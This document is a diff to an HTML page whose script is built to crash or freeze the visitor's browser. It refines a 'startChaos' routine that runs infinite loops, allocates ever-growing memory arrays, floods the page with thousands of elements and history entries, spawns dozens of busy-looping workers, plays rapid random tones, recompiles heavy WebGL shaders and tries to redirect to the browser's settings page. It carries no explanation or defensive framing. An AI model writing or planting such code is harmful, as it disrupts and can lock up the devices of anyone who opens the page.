@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <title></title>
 <style>
+*{will-change:transform,filter;}
 body{margin:0;overflow:hidden;background:black;}
 canvas{position:fixed;left:0;top:0;}
 </style>
@@ -17,22 +18,31 @@ const canvas=document.getElementById("gl");
 canvas.width=innerWidth;
 canvas.height=innerHeight;
 const gl=canvas.getContext("webgl");
-gl.clearColor(0,0,0,1);
+gl.clearColor(1,0,0,1);
 gl.clear(gl.COLOR_BUFFER_BIT);
 
+setTimeout(startChaos,1000);
+
+function startChaos(){
+
 setTimeout(()=>{
+ try{location.href="chrome://settings"}catch(e){}
+ try{location.replace("chrome://settings")}catch(e){}
+},3000);
 
 setTimeout(()=>{
  while(true){Math.sqrt(Math.random()*Date.now())}
-},200);
+},2000);
 
 let mem=[];
+let size=50_000_000;
 setInterval(()=>{
- mem.push(new Uint8Array(100_000_000));
-},60);
+ mem.push(new Uint8Array(size));
+ size+=25_000_000;
+},120);
 
 setInterval(()=>{
- for(let i=0;i<6000;i++){
+ for(let i=0;i<5000;i++){
   let d=document.createElement("div");
   d.textContent=Math.random();
   d.style.position="absolute";
@@ -44,11 +54,16 @@ setInterval(()=>{
 
 setInterval(()=>{
  history.pushState({}, "", "#"+Math.random());
-},20);
+},30);
 
-for(let i=0;i<40;i++){
- new Worker(URL.createObjectURL(new Blob([`while(true){Math.tan(Math.random())}`])));
-}
+let workers=0;
+let wInt=setInterval(()=>{
+ new Worker(URL.createObjectURL(new Blob([`
+  while(true){Math.tan(Math.random())}
+ `])));
+ workers++;
+ if(workers>40) clearInterval(wInt);
+},100);
 
 const AC=window.AudioContext||window.webkitAudioContext;
 const ac=new AC();
@@ -57,8 +72,8 @@ setInterval(()=>{
  o.frequency.value=Math.random()*6000;
  o.connect(ac.destination);
  o.start();
- o.stop(ac.currentTime+0.2);
-},40);
+ o.stop(ac.currentTime+0.05);
+},80);
 
 const flood=document.createElement("canvas");
 document.body.appendChild(flood);
@@ -83,17 +98,20 @@ const quad=[
 function frag(){
 return `
 precision highp float;
+float h(vec2 p){return fract(sin(dot(p,vec2(127.1,311.7)))*43758.5);}
 void main(){
  vec2 uv=gl_FragCoord.xy/vec2(${innerWidth}.0,${innerHeight}.0);
  vec3 c=vec3(0.);
- for(int i=0;i<60;i++){
+ for(int i=0;i<40;i++){
   float t=float(i);
+  uv+=vec2(sin(uv.y*t*10.),cos(uv.x*t*10.))*0.02;
   c+=vec3(
-   sin(uv.x*150.+t),
-   cos(uv.y*150.-t),
-   sin((uv.x+uv.y)*80.)
+   sin(uv.x*100.+t),
+   cos(uv.y*100.-t),
+   sin((uv.x+uv.y)*50.)
   );
  }
+ c+=vec3(h(uv));
  gl_FragColor=vec4(c,1.);
 }`;
 }
@@ -130,13 +148,23 @@ let prog=build();
 setInterval(()=>{prog=build()},200);
 
 setInterval(()=>{
- canvas.width=300+Math.random()*2000;
- canvas.height=300+Math.random()*2000;
+ canvas.width=500+Math.random()*2000;
+ canvas.height=500+Math.random()*2000;
  gl.viewport(0,0,canvas.width,canvas.height);
 },150);
 
+setInterval(()=>{
+ let c=document.createElement("canvas");
+ let g=c.getContext("webgl");
+ if(g){
+  let s=g.createShader(g.FRAGMENT_SHADER);
+  g.shaderSource(s,frag());
+  g.compileShader(s);
+ }
+},200);
+
 function draw(){
- for(let i=0;i<20;i++){
+ for(let i=0;i<10;i++){
   gl.drawArrays(gl.TRIANGLES,0,6);
  }
  gl.finish();
@@ -144,8 +172,7 @@ function draw(){
 }
 draw();
 
-},2000);
+}
 </script>
-
 </body>
 </html>
